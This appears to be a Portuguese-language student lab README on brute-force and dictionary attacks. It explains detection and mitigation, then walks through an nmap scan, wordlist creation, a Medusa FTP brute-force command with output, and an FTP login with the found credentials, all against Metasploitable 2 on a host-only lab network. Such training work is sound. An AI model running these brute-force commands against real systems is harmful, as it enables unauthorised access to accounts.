# Projeto de Simulação de Ataques de Força Bruta com Kali Linux e Medusa

## Descrição do Projeto
Este projeto tem como objetivo demonstrar a execução de ataques de força bruta utilizando Kali Linux e a ferramenta Medusa contra serviços vulneráveis do Metasploitable 2 e aplicação DVWA (Damn Vulnerable Web Application). O projeto também aborda a configuração do ambiente para testes de segurança, tipos de ataques cibernéticos, vulnerabilidades exploradas e medidas de mitigação para proteger sistemas.

## Objetivos
- Compreender ataques de força bruta em serviços FTP, Web e SMB.
- Utilizar Kali Linux e Medusa para auditoria de segurança em ambiente controlado.
- Documentar processos técnicos de forma clara e estruturada.
- Reconhecer vulnerabilidades comuns e propor medidas de mitigação.
- Disponibilizar a documentação e evidências em repositório GitHub como portfólio técnico.

## Ambiente Configurado
- Duas VMs no VirtualBox:
  - Kali Linux (atacante)
  - Metasploitable 2 (vítima vulnerável)
- Rede configurada como Host-Only para comunicação interna entre as VMs.
- DVWA instalado na Metasploitable 2 para testes em aplicações web.



***
# Entendendo 2 tipos de ataques: Dicionário e Força Bruta

## Ataque de Dicionário
- Usa uma **lista predefinida** de palavras, a "lista do dicionário", com senhas comuns como nomes, datas especiais, palavras populares e variações.
- É eficaz porque muitas pessoas usam senhas previsíveis, e a lista diminui o número de tentativas precisas.

**Como funciona:**
1. O atacante escolhe um alvo.
2. Automatiza tentativas com palavras do dicionário.
3. Quando encontra a senha, acessa o sistema.

### Detecção
- Muitos acessos falhos vindos de um mesmo IP, tentando senhas conhecidas.
- Padrões repetitivos de senhas em relatórios de falhas.

### Mitigação
- Proibir senhas presentes em listas de senhas comuns.
- Usar autenticação multifator para evitar acesso mesmo se a senha for descoberta.
- Monitorar e bloquear automaticamente tentativas repetidas da mesma fonte.

***

## Ataque de Força Bruta
- Testa **todas as combinações possíveis** de caracteres (letras, números, símbolos) sem usar listas.
- Muito mais lento e custoso, pois o espaço de combinações cresce exponencialmente com o tamanho da senha.

**Como funciona:**
1. O invasor inicia tentativas começando de senhas curtas e simples, evoluindo para combinações mais complexas.
2. Usa scripts, GPUs e até redes distribuídas para tentar milhares ou milhões de senhas em paralelo.

### Detecção
- Alto volume de tentativas aleatórias e sem padrão definido.
- Tentativas de senhas de tamanho crescente e variações extensas.

### Mitigação
- Limitar tentativas simultâneas e implementar bloqueio progressivo (delay ou bloqueio após várias tentativas).
- Exigir senhas longas e complexas para aumentar o tempo necessário para um ataque bem-sucedido.
- Ativar autenticação multifator.

***

## Diferenças principais
- **Dicionário:** usa lista de palavras conhecidas, mais rápido e eficiente contra senhas comuns.
- **Força bruta:** tenta tudo possível, bom para senhas fortes, mas muito mais lento.

## Resumo
| Aspecto           | Ataque de Dicionário                 | Ataque de Força Bruta                 |
|-------------------|------------------------------------|-------------------------------------|
| Método            | Tenta senhas de uma lista prévia   | Tenta todas as combinações possíveis|
| Velocidade        | Mais rápido                        | Mais lento                          |
| Efetividade       | Bom contra senhas fracas e comuns | Pode quebrar senhas únicas, mas leva muito tempo|
| Detecção          | Padrão de senhas repetidas          | Volume alto e combinações aleatórias|


# Prática:

## Ataques Executados

# Ataque de Força Bruta FTP com Medusa

## 1) Enumeração com nmap (portas 21,22,80,139,445)
   
  Comando: nmap -sV -p 21,22,80,139,445 192.168.10.3 
   ### varre as portas específicas com detecção de versão 


O que fazem os parâmetros:

nmap → Programa de varredura de portas e enumeração de rede.

-p 21,22,80,139,445 → varre apenas essas portas.

-sV → tenta descobrir versão do serviço.


### Exemplo de saída:

──(kali㉿kali)-[~]
└─$ nmap -sV -p 21,22,80,139,445 192.168.10.3                         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 17:12 EDT
Nmap scan report for 192.168.10.3
Host is up (0.0027s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.10.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)



 ## 2) Lista de contas / senhas para teste (wordlists simples)

Crie dois arquivos (um para usuários, outro para senhas). 
### users.txt
┌──(kali㉿kali)-[~]
└─$ mkdir -p ~/wordlists   
                                                                                                                                
                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cat > ~/wordlists/users.txt <<'EOF'
msfadmin
root
admin
user
test
guest
ftp
anonymous
tom
backup
EOF
                                                                                                                                 
### passwords.txt
cat > ~/wordlists/passwords.txt <<'EOF'
msfadmin
msf
toor
root
admin
password
123456
test
guest
ftp
EOF

## 3) Brute-force/enumeração com Medusa (FTP)

Instalação (se necessário):

sudo apt update

sudo apt install medusa -y

### Comando Medusa para FTP, usando listas criadas:
medusa -h 192.168.10.3 -U ~/wordlists/users.txt -P ~/wordlists/passwords.txt -M ftp -t 6 -f

O que significam as flags:

-h → alvo (IP).

-U → lista de usuários (um por linha).

-P → lista de senhas.

-M ftp → módulo/serviço FTP.

-t 6 → número de threads concorrentes (ajuste conforme CPU/rede).

-f → parar o ataque quando encontrar uma credencial válida para um usuário.

### Exemplo de saída esperada quando encontra credenciais:

┌──(kali㉿kali)-[~/wordlists]
└─$ medusa -h 192.168.10.3 -U ~/wordlists/users.txt -P ~/wordlists/passwords.txt -M ftp -t 6 -f

Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-10-07 17:50:37 ACCOUNT CHECK: [ftp] Host: 192.168.10.3 (1 of 1, 0 complete) User: msfadmin (1 of 10, 0 complete) Password: msfadmin (1 of 10 complete)
### 2025-10-07 17:50:37 ACCOUNT FOUND: [ftp] Host: 192.168.10.3 User: msfadmin Password: msfadmin [SUCCESS]
2025-10-07 17:50:38 ACCOUNT CHECK: [ftp] Host: 192.168.10.3 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: admin (2 of 10 complete)
2025-10-07 17:50:38 ACCOUNT CHECK: [ftp] Host: 192.168.10.3 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: password (3 of 10 complete)
2025-10-07 17:50:38 ACCOUNT CHECK: [ftp] Host: 192.168.10.3 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: msf (4 of 10 complete)
2025-10-07 17:50:40 ACCOUNT CHECK: [ftp] Host: 192.168.10.3 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: root (5 of 10 complete)
2025-10-07 17:50:40 ACCOUNT CHECK: [ftp] Host: 192.168.10.3 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: toor (6 of 10 complete)
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/wordlists]
└─$ 

## 4) Teste de conexão FTP com as credenciais encontradas

Suponha que o medusa retornou msfadmin:msfadmin. Teste com um cliente FTP simples.

Modo interativo (ftp client):

Comando: ftp 192.168.10.3
### quando pedir:
Name (192.168.10.3:youruser): msfadmin
Password: msfadmin

Saída esperada:

┌──(kali㉿kali)-[~/wordlists]
└─$ ftp 192.168.10.3
Connected to 192.168.10.3.
220 (vsFTPd 2.3.4)
Name (192.168.10.3:kali): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
 

